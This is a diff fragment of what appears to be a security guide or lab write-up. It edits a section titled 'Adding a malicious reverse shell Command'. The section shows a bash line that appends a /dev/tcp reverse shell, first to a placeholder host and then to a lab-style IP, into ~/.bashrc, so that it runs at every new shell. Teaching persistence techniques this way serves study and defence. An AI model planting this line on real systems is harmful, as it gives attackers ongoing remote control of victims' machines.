@@ -127,7 +127,7 @@ export EDITOR=vim
 ### Adding a malicious reverse shell Command
 
 ```bash
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc
+echo '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.224/8080 0>&1"' >> ~/.bashrc
 ```
 
 The command will execute whenever a new Bash session is opened.
